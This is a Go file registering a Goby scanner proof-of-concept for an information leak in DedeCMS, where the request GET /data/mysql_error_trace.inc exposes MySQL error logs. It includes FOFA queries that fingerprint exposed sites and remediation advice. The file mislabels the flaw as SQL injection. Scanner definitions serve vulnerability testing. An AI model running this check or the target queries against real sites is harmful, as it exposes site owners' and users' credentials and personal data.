package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "DedeCMS mysql_error_trace.inc infoleak",
    "Description": "Due to improper configuration of decms, sensitive information is leaked",
    "Impact": "DedeCMS mysql_error_trace.inc infoleak",
    "Recommendation": "<p>The error information of the website is returned uniformly and processed fuzzily.</p><p>Encryption and proper storage of sensitive information files, file name randomization, to avoid leakage of sensitive information.</p>",
    "Product": "DedeCMS",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "DedeCms mysql_error_trace.inc 敏感信息泄露",
            "Description": "DedeCms在data目录下有个错误日志文件-mysql_error_trace.inc。此文件是用来存储mysql的错误日志，错误日志中经常会出现敏感信息，例如：后台目录、账户信息等。",
            "Impact": "<p>攻击者可直接下载用户的相关信息，包括网站的绝对路径、用户的登录名、密码、真实姓名、身份证号、电话号码、邮箱、QQ号等。</p><p>攻击者通过构造特殊URL地址，触发系统web应用程序报错，在回显内容中，获取网站敏感信息。</p><p>攻击者利用泄漏的敏感信息，获取网站服务器web路径，为进一步攻击提供帮助。</p>",
            "Recommendation": "<p>对网站错误信息进行统一返回，模糊化处理。</p><p>对存放敏感信息的文件进行加密并妥善储存，避免泄漏敏感信息。</p>",
            "Product": "DedeCMS",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "DedeCMS mysql_error_trace.inc infoleak",
            "Description": "Due to improper configuration of decms, sensitive information is leaked",
            "Impact": "DedeCMS mysql_error_trace.inc infoleak",
            "Recommendation": "<p>The error information of the website is returned uniformly and processed fuzzily.</p><p>Encryption and proper storage of sensitive information files, file name randomization, to avoid leakage of sensitive information.</p>",
            "Product": "DedeCMS",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "((body=\"Power by DedeCms\" || (body=\"Powered by\" && body=\"http://www.dedecms.com/\" && body=\"DedeCMS\") || body=\"/templets/default/style/dedecms.css\") || body=\"<div><h3>DedeCMS Error Warning!</h3>\")",
    "GobyQuery": "((body=\"Power by DedeCms\" || (body=\"Powered by\" && body=\"http://www.dedecms.com/\" && body=\"DedeCMS\") || body=\"/templets/default/style/dedecms.css\") || body=\"<div><h3>DedeCMS Error Warning!</h3>\")",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "http://www.dedecms.com/",
    "DisclosureDate": "2021-06-16",
    "References": [
        "https://blog.csdn.net/weixin_34237700/article/details/113464714"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/data/mysql_error_trace.inc",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<?php  exit();",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/data/mysql_error_trace.inc",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<?php  exit();",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10209"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
